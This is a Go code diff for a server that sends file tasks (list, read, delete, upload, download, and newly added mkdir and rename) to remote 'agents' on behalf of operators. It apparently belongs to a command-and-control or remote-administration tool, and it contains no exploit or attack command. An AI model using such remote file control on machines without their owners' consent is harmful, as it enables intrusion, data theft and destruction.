@@ -50,14 +50,8 @@ func (s *Server) handleListDir(c *gin.Context) {
 		path = "C:\\"
 	}
 
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "ls", path, "", path, "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("Failed to create task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "ls", Command: path, Path: path})
+	if task == nil {
 		return
 	}
 
@@ -81,19 +75,57 @@ func (s *Server) handleFileDelete(c *gin.Context) {
 		return
 	}
 
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "delete", filePath, "", filePath, "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("Failed to create task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "delete", Command: filePath, Path: filePath})
+	if task == nil {
 		return
 	}
 
 	slog.Info("File delete requested", "agent_id", id, "path", filePath)
 	s.dispatchTask(c, task, "file_delete", filePath)
+}
+
+func (s *Server) handleFileMkdir(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	dirPath := c.PostForm("path")
+	if dirPath == "" {
+		respondError(c, http.StatusBadRequest, "directory path required")
+		return
+	}
+
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "mkdir", Command: dirPath, Path: dirPath})
+	if task == nil {
+		return
+	}
+
+	slog.Info("Directory create requested", "agent_id", id, "path", dirPath)
+	s.dispatchTask(c, task, "file_mkdir", dirPath)
+}
+
+func (s *Server) handleFileRename(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	srcPath := c.PostForm("path")
+	dstPath := c.PostForm("dest")
+	if dstPath == "" {
+		dstPath = c.PostForm("destination")
+	}
+	if srcPath == "" || dstPath == "" {
+		respondError(c, http.StatusBadRequest, "source and destination paths required")
+		return
+	}
+
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "rename", Command: srcPath, Path: srcPath, Data: dstPath})
+	if task == nil {
+		return
+	}
+
+	slog.Info("File rename requested", "agent_id", id, "src", srcPath, "dst", dstPath)
+	s.dispatchTask(c, task, "file_rename", srcPath+" -> "+dstPath)
 }
 
 func (s *Server) handleFileRead(c *gin.Context) {
@@ -107,14 +139,8 @@ func (s *Server) handleFileRead(c *gin.Context) {
 		return
 	}
 
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "read", filePath, "", filePath, "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("Failed to create task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "read", Command: filePath, Path: filePath})
+	if task == nil {
 		return
 	}
 
@@ -144,15 +170,9 @@ func (s *Server) handleFileUploadFromAgent(c *gin.Context) {
 		return
 	}
 
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
 	offset, size := parseTransferRange(c)
-	task, err := s.createTask(id, "upload", filePath, "", filePath, "", offset, size)
-	if err != nil {
-		slog.Error("Failed to create task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "upload", Command: filePath, Path: filePath, Offset: offset, Size: size})
+	if task == nil {
 		return
 	}
 
@@ -192,14 +212,8 @@ func (s *Server) handleDownload(c *gin.Context) {
 		return
 	}
 
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "download", fileURL, targetPath, targetPath, "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("Failed to create task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "download", Command: fileURL, Shell: targetPath, Path: targetPath})
+	if task == nil {
 		return
 	}
 
@@ -245,10 +259,8 @@ func (s *Server) handleUploadFile(c *gin.Context) {
 		return
 	}
 
-	task, err := s.createTask(id, "upload", targetPath, "", targetPath, fileData, 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("Failed to create task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "upload", Command: targetPath, Path: targetPath, Data: fileData})
+	if task == nil {
 		return
 	}
 	// chunked support — validate offset to prevent negative seek corruption and sparse file bomb
